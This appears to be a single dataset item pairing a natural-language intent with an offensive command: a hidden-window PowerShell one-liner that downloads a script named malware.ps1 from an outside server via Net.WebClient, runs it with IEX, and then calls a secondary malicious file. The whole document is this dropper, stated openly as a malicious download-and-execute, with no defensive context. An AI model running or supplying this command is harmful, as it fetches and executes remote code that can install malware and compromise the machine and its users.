# Natural language intent:
# Download and execute a PowerShell script from a specified server, including a secondary malicious file.

powershell.exe -nop -w hidden -c "IEX (New-Object Net.WebClient).DownloadString('http://heavy-server.com/malware.ps1'); maliciousfile"
